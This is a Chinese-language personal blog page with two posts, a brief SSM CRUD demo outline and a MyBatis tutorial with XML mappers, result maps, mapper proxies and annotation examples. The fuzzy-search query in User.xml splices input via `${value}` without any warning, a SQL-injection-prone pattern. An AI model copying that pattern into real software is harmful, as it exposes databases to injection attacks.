              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-25T08:15:41+08:00">
                2019-01-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>模仿网上的教程,使用ssm完成一个对用户进行增删改查的小demo</p>
</blockquote>
<hr>
<h3 id="使用Maven构建SSM项目"><a href="#使用Maven构建SSM项目" class="headerlink" title="使用Maven构建SSM项目"></a>使用Maven构建SSM项目</h3><pre><code>1.导入 jar 包(如果使用 maven 则配置 pom.xml)
2.配置 web.xml 文件
3.配置 spring.xml springMVC.xml myBatis.xml
4.配置资源文件，database.properties，log4j.properties 等等
5.设计 entity 实体类
6.编写 DAO 层接口和 Mapper.xml
7.编写 service 业务层
8.编写 cotroller 控制器
9.视图代码：前台 jsp 页面

1.在pom.xml项目中添加SSM项目需要的jar包    
2.配置Spring mvc的相关配置信息(自动扫描cn.test包下带有注解的类)            
3.通过xml方式配置日志与数据库
4.创建实体类User Dao类UserDao 业务类UserService
5.创建控制器UserController并返回数据到视图层`view/*.jsp`
</code></pre><p>测试界面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-24.10.42.18-image.png" alt="2019-01-24.10.42.18-image.png"></p>
<p>项目结构:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-24.20.17.58-image.png" alt="2019-01-24.20.17.58-image.png"></p>
<h3 id="学生管理系统-SSM版"><a href="#学生管理系统-SSM版" class="headerlink" title="学生管理系统(SSM版)"></a>学生管理系统(SSM版)</h3><p>ssm框架基本结构图：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-25.22.17.27-image.png" alt="2019-01-25.22.17.27-image.png"></p>
<p>用户访问SSM流程图:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-25.21.00.51-image.png" alt="2019-01-25.21.00.51-image.png"></p>
<p><a href="https://github.com/P0rZ9/SSM" target="_blank" rel="noopener">源代码</a>    </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Mybatis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/23/Mybatis/" itemprop="url">ssm基础之MyBatis</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T09:15:41+08:00">
                2019-01-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>学习了MYBATIS,记录一波    </p>
</blockquote>
<h3 id="Mybatis简介"><a href="#Mybatis简介" class="headerlink" title="Mybatis简介"></a>Mybatis简介</h3><blockquote>
<p>MyBatis 本是apache的一个开源项目iBatis, 2010年这个项目由apache software foundation 迁移到了google code，并且改名为MyBatis，是一个基于Java的持久层框架。</p>
</blockquote>
<p><strong>持久层</strong>： 可以将业务数据存储到磁盘，具备长期存储能力，只要磁盘不损坏，在断电或者其他情况下，重新开启系统仍然可以读取到这些数据。<br><strong>优点</strong>： 可以使用巨大的磁盘空间存储相当量的数据，并且很廉价<br><strong>缺点</strong>：慢（相对于内存而言）</p>
<p><strong>为什么使用Mybatis</strong>        </p>
<blockquote>
<p>传统JDBC中,除了自己提供sql语句外,还必须操作Connection,Statement,ResultSet,非常繁琐。使用Mybatis后,只需要提供sql语句即可,我们只需要重点关注增删改查这些操作层面上。并且Mybatis支持使用简单的XML或注解来配置和映射原生信息,将接口和Java对象映射为数据库中的记录。            </p>
</blockquote>
<p>Mybatis运行程序原理图:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-22.20.51.18-image.png" alt="2019-01-22.20.51.18-image.png"></p>
<pre><code>程序执行顺序:
1.应用程序找Mybatis要数据            
2.Mybatis从数据库找来数据        
    2.1 通过mybatis-config.xml定位数据库        
    2.2 通过User.xml执行对应的select语句        
    2.3 基于User.xml把返回的数据库记录封装在User对象中
    2.4 将多个User对象封装在一个User集合中        
3.返回一个User集合
</code></pre><h3 id="第一个Mybatis程序"><a href="#第一个Mybatis程序" class="headerlink" title="第一个Mybatis程序"></a>第一个Mybatis程序</h3><p>1.Maven pom.xml    </p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;mysql&lt;/groupId&gt;
    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
    &lt;version&gt;5.1.43&lt;/version&gt;
&lt;/dependency&gt;

&lt;!-- Mybatis依赖 --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;
    &lt;version&gt;3.4.4&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>2.Mybatis 配置文件 mybatis-config.xml<br>作用主要就是提供连接数据库用的驱动,数据名称,编码方式,账号密码等</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE configuration
        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;

&lt;configuration&gt;


    &lt;typeAliases&gt;
        &lt;package name=&quot;com.test.pojo&quot;/&gt;
    &lt;/typeAliases&gt;

    &lt;environments default=&quot;development&quot;&gt;
        &lt;environment id=&quot;development&quot;&gt;
            &lt;transactionManager type=&quot;JDBC&quot;/&gt;
            &lt;dataSource type=&quot;POOLED&quot;&gt;
                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;
                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&quot;/&gt;
                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;
                &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt;
            &lt;/dataSource&gt;
        &lt;/environment&gt;
    &lt;/environments&gt;
    &lt;mappers&gt;
        &lt;mapper resource=&quot;com/test/pojo/User.xml&quot;/&gt;
    &lt;/mappers&gt;

&lt;/configuration&gt;
</code></pre><p>3.配置文件User.xml</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;

&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
    &lt;select id=&quot;listUser&quot; resultType=&quot;User&quot;&gt;
            select * from user
    &lt;/select&gt;

    &lt;insert id=&quot;addUser&quot; parameterType=&quot;User&quot;&gt;
        insert into user ( name ) values (#{name})
    &lt;/insert&gt;

    &lt;delete id=&quot;delUser&quot; parameterType=&quot;User&quot;&gt;
        delete from user where id = #{id}
    &lt;/delete&gt;

    &lt;select id=&quot;getUser&quot; parameterType=&quot;_int&quot; resultType=&quot;User&quot;&gt;
        select * from user where id=#{id}
    &lt;/select&gt;

    &lt;update id=&quot;updateUser&quot; parameterType=&quot;User&quot; &gt;
        update user set name = #{name} where id=#{id}
    &lt;/update&gt;

    &lt;!--模糊查询--&gt;
    &lt;select id=&quot;findUserByName&quot; parameterType=&quot;String&quot; resultType=&quot;User&quot;&gt;
        select * from user where name like &apos;%${value}%&apos;
    &lt;/select&gt;


&lt;/mapper&gt;
</code></pre><p>由于在主配置文件里配置了<code>&lt;typeAliases&gt;</code>别名,所以在这里的resultType可以直接写User,不用写全名pojo.User<br>namespace属性就是对SQL语句进行分类管理,实现不同业务的SQL隔离。            </p>
<p>4.测试类  TestMybatis.java    </p>
<pre><code>TestMybatis.java            
package com.test;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;

import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;

import com.test.pojo.User;

public class TestMybatis {

public static void main(String[] args) throws IOException {
    String resource = &quot;mybatis-config.xml&quot;;
    InputStream inputStream = Resources.getResourceAsStream(resource);
    SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
    SqlSession session=sqlSessionFactory.openSession();


    //插入用户
    User user1 = new User();
    user1.setName(&quot;test1&quot;);
    session.insert(&quot;addUser&quot;,user1);

   //修改用户
    User user2 = session.selectOne(&quot;getUser&quot;,5);
    user2.setName(&quot;test_after&quot;);
    session.update(&quot;updateUser&quot;,user2);

    //删除用户
    User user3 = new User();
    user3.setId(3);
    session.delete(&quot;delUser&quot;,user3);

    //获取用户
    User user4 = session.selectOne(&quot;getUser&quot;,5);
    System.out.println(user4.getName());

    //模糊查询
    List&lt;User&gt; users = session.selectList(&quot;findUserByName&quot;,&quot;te&quot;);
    for(User user : users){
        System.out.println(user.getId()+&quot;:&quot;+user.getName());
    }

    //获取全部用户
    listAll(session);
    session.commit();
    session.close();
}

private static void listAll(SqlSession session){

    //列出全部用户
    List&lt;User&gt; users=session.selectList(&quot;listUser&quot;);
    for (User user : users) {
        System.out.println(user.getName());
    }
}
}
</code></pre><p>xml文件几个概念:<br>parameterType：指定输入参数类型,可为基本数据类型(int float)与包装数据类型(String Interger)以及用户编写的JavaBean类<br>resultType: 指定从数据库返回的信息对应的Java数据类型。</p>
<p>#{}： 占位符,该符号接收输入参数,花括号中编写参数名称来接收对应参数。当#{}接收简单类型时可用value或者其他名称来获取。<br>${}：表示拼接符,可在原有SQL语句上拼接新的符合SQL语法的语句。            </p>
<p>MyBatis使用场景:通过上面的入门程序,MyBatis的特点就是以Sql语句为核心的不完全的ORM(关系型映射)框架。使用场景为:对SQL语句优化要求比较高,项目需求经常变动。            </p>
<h3 id="MyBatis深入学习"><a href="#MyBatis深入学习" class="headerlink" title="MyBatis深入学习"></a>MyBatis深入学习</h3><h4 id="编写日志输出环境配置文件"><a href="#编写日志输出环境配置文件" class="headerlink" title="编写日志输出环境配置文件"></a>编写日志输出环境配置文件</h4><h4 id="MyBatis高级映射"><a href="#MyBatis高级映射" class="headerlink" title="MyBatis高级映射"></a>MyBatis高级映射</h4><h5 id="一对一查询"><a href="#一对一查询" class="headerlink" title="一对一查询"></a>一对一查询</h5><p>查询number对应的学生姓名。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-22.23.40.15-image.png" alt="2019-01-22.23.40.15-image.png"></p>
<h6 id="使用resultType-只能映射到一个确定的Java包装类"><a href="#使用resultType-只能映射到一个确定的Java包装类" class="headerlink" title="使用resultType    (只能映射到一个确定的Java包装类)"></a>使用resultType    (只能映射到一个确定的Java包装类)</h6><p>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
<pre><code>  &lt;mappers&gt;
    &lt;mapper resource=&quot;com/test/pojo/Student.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.Student.xml            </p>
<pre><code>&lt;select id=&quot;findStudentByCard&quot; parameterType=&quot;_int&quot; resultType=&quot;Student&quot;&gt;
  SELECT
    student.*,
    card.*
  FROM
    student,card
  WHERE student.card_id = card.id AND card.number = #{value}
&lt;/select&gt;
</code></pre><h6 id="使用-resultMap-实现"><a href="#使用-resultMap-实现" class="headerlink" title="使用 resultMap 实现"></a>使用 resultMap 实现</h6><p>使用resultMap可以将数据字段映射到名称不一样的响应实体类属性中,重要的是可映射到实体类包裹的其他实体类。<br>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
<pre><code>  &lt;mappers&gt;
    &lt;mapper resource=&quot;com/test/pojo/Student.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.创建一个新的实体类(包含Student与card)<br>StudentWithCard.java </p>
<pre><code>package com.test.pojo;
  public class StudentWithCard {
    Student student;
    int number;
    int id;

      //geter and seter
  }
</code></pre><p>3.Student.xml</p>
<pre><code>&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
&lt;select id=&quot;findStudentByCard&quot; parameterType=&quot;_int&quot; resultMap=&quot;StudentInfoMap&quot;&gt;
  SELECT
    student.*,
    card.*
  FROM
    student,card
  WHERE student.card_id = card.id AND card.number = #{value}
&lt;/select&gt;

&lt;resultMap id=&quot;StudentInfoMap&quot; type=&quot;StudentWithCard&quot;&gt;
&lt;!-- id 标签表示对应的主键
     column 对应查询结果的列值
     property 对应封装类中的属性名称
--&gt;
      &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;
      &lt;result column=&quot;number&quot; property=&quot;number&quot;/&gt;
      &lt;!-- association 表示关联的嵌套结果，
           可以简单理解就是为封装类指定的标签
           --&gt;
      &lt;association property=&quot;student&quot; javaType=&quot;Student&quot;&gt;
        &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;
        &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;
        &lt;result column=&quot;card_id&quot; property=&quot;card_id&quot;/&gt;
      &lt;/association&gt;
&lt;/resultMap&gt;
&lt;/mapper&gt;
</code></pre><p>4.测试类(取出number为1111的学生的信息):</p>
<pre><code>StudentWithCard student = session.selectOne(&quot;findStudentByCard&quot;,1111);
System.out.println(student.getStudent().getName());
</code></pre><p>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.11.35.57-image.png" alt="2019-01-23.11.35.57-image.png"></p>
<h5 id="一对多查询"><a href="#一对多查询" class="headerlink" title="一对多查询"></a>一对多查询</h5><p>查询选修了同一个班级的同学信息<br>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.11.42.33-image.png" alt="2019-01-23.11.42.33-image.png"><br>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
<pre><code>&lt;mappers&gt;
  &lt;mapper resource=&quot;com/test/pojo/Class.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.创建class实体类    </p>
<pre><code>package com.test.pojo;
import java.util.List;
public class Class {
    private int id;
    private String name;
    private List&lt;Student&gt; students;
      //geter and seter
  }
</code></pre><p>3.映射文件Class.xml            </p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;

&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;

    &lt;resultMap id=&quot;Students&quot; type=&quot;Student&quot;&gt;
        &lt;id column=&quot;student_id&quot; property=&quot;student_id&quot; /&gt;
        &lt;result column=&quot;name&quot; property=&quot;name&quot; /&gt;
    &lt;/resultMap&gt;

    &lt;select id=&quot;listStudentByClassName&quot; parameterType=&quot;String&quot; resultMap=&quot;Students&quot;&gt;
        select student.* from student, class where student.student_id = class.student_id and class.name = #{value}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre><p>子元素说明:<br>  id: 设置主键字段与模型属性的映射关系<br>  result: 设置普通字段与模型属性的关系            </p>
<p>配置属性:<br>  property: 映射到JavaBean的属性名称<br>  column: 数据表的列名或者标签别名<br>  javaType: 一个完整的类名,匹配的是一个JavaBean,MyBatis会自动检测</p>
<p>4.测试类(输出课程为Java课的学生信息):</p>
<pre><code>List&lt;Student&gt; students = session.selectList(&quot;listStudentByClassName&quot;,&quot;Java课&quot;);
for (Student student : students){
    System.out.println(&quot;ID:&quot;+student.getStudent_id()+&quot;,NAME:&quot;+student.getName());
}  
</code></pre><p>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.12.28.48-image.png" alt="2019-01-23.12.28.48-image.png"></p>
<p>结合sql语句与映射文件,就可以很方便的操作数据库        </p>
<h3 id="Mapper-代理实例编写"><a href="#Mapper-代理实例编写" class="headerlink" title="Mapper 代理实例编写"></a>Mapper 代理实例编写</h3><p>1.Mybatis-config.xml        </p>
<pre><code>&lt;mappers&gt;
    &lt;mapper resource=&quot;com/test/pojo/StudentMapper.xml&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>2.StudentMapper.xml        </p>
<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE mapper
        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;

&lt;mapper namespace=&quot;com.test.pojo.mapper.StudentMapper&quot;&gt;
    &lt;!-- 查询学生 --&gt;
    &lt;select id=&quot;findStudentById&quot; parameterType=&quot;_int&quot; resultType=&quot;com.test.pojo.Student&quot;&gt;
        SELECT * FROM student WHERE student_id = #{id}
    &lt;/select&gt;
    &lt;!-- 增加用户 --&gt;
    &lt;insert id=&quot;insertStudent&quot; parameterType=&quot;com.test.pojo.Student&quot;&gt;
        INSERT INTO student(student_id, name) VALUES(#{id}, #{name})
    &lt;/insert&gt;
    &lt;!-- 删除用户 --&gt;
    &lt;delete id=&quot;deleteStudent&quot; parameterType=&quot;_int&quot;&gt;
        DELETE FROM student WHERE student_id = #{id}
    &lt;/delete&gt;
    &lt;!-- 修改用户 --&gt;
    &lt;update id=&quot;updateStudent&quot; parameterType=&quot;com.test.pojo.Student&quot;&gt;
        UPDATE student SET name = #{name} WHERE student_id = #{id}
    &lt;/update&gt;
&lt;/mapper&gt;
</code></pre><p>如果需要使用StudentMapper.xml的Mapper代理,需要先定义一个接口,名为StudentMapper,然后新建方法定义,分别对应配置文件的增删改查配置,然后将StudentMapper中的namespace改为接口定义的地方,即可在业务类中使用Mapper代理。<br>3.StudentMapper.java接口类(pojo/mapper/StudentMapper.java)    </p>
<pre><code>package com.test.pojo.mapper;
import com.test.pojo.Student;
public interface StudentMapper {

    // 根据 id 查询学生信息
    public Student findStudentById(int id) throws Exception;

    // 添加学生信息
    public void insertStudent(Student student) throws Exception;

    // 删除学生信息
    public void deleteStudent(int id) throws Exception;

    // 修改学生信息
    public void updateStudent(Student student) throws Exception;
}
</code></pre><p>4.测试类Test.java            </p>
<pre><code>  package com.test;

import java.io.InputStream;
import com.test.pojo.Student;
import com.test.pojo.mapper.StudentMapper;
import org.apache.ibatis.io.Resources;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.apache.ibatis.session.SqlSessionFactoryBuilder;



public class Test {

    public static void main(String[] args) throws Exception {
        String resource = &quot;mybatis-config.xml&quot;;
        InputStream inputStream = Resources.getResourceAsStream(resource);
        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
        SqlSession session=sqlSessionFactory.openSession();

        // 获取Mapper代理
        StudentMapper studentMapper = session.getMapper(StudentMapper.class);


        //执行 Mapper 代理独享的查询方法
        Student student = studentMapper.findStudentById(1);
        System.out.println(student.getName());

        //insertStudent
        Student student1 = new Student();
        student1.setName(&quot;test_1&quot;);
        student1.setStudent_id(3);
        studentMapper.insertStudent(student1);

        //deleteStudent
        studentMapper.deleteStudent(3);

        //updateStudent
        Student student2 = new Student();
        student2.setStudent_id(2);
        student2.setName(&quot;student_2&quot;);
        studentMapper.updateStudent(student2);

        session.close();
    }}
</code></pre><h3 id="注解开发MyBatis"><a href="#注解开发MyBatis" class="headerlink" title="注解开发MyBatis"></a>注解开发MyBatis</h3><p>依照刚才Mapper的例子:<br>1.我们将StudentMapper.xml的配置的sql语句用注释配置在StudentMapper接口中:</p>
<pre><code>  public interface StudentMapper {

    // 根据 id 查询学生信息
    @Select(&quot;SELECT * FROM student WHERE student_id = #{id}&quot;)
    public Student findStudentById(int id) throws Exception;

    // 添加学生信息
    @Insert(&quot;INSERT INTO student(student_id, name) VALUES(#{id}, #{name})&quot;)
    public void insertStudent(Student student) throws Exception;

    // 删除学生信息
    @Delete(&quot;DELETE FROM student WHERE student_id = #{id}&quot;)
    public void deleteStudent(int id) throws Exception;

    // 修改学生信息
    @Update(&quot;UPDATE student SET name = #{name} WHERE student_id = #{id}&quot;)
    public void updateStudent(Student student) throws Exception;
}
</code></pre><p>2.修改mybatis-config.xml(将之前配置的映射注释掉)</p>
<pre><code>&lt;!-- 映射文件 --&gt;
&lt;mappers&gt;
    &lt;!--&lt;mapper resource=&quot;com/test/pojo/StudentMapper.xml&quot;/&gt;--&gt;
    &lt;mapper class=&quot;com.test.pojo.mapper.StudentMapper&quot;/&gt;
&lt;/mappers&gt;
</code></pre><p>3.测试类代码不变,即可运行程序            </p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.jianshu.com/p/c77e3691867d" target="_blank" rel="noopener">https://www.jianshu.com/p/c77e3691867d</a><br><a href="http://how2j.cn/k/mybatis/mybatis-tutorial/1087.html" target="_blank" rel="noopener">http://how2j.cn/k/mybatis/mybatis-tutorial/1087.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">P0rZ9</p>
              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">57</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">P0rZ9</span>

  
</div>












        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
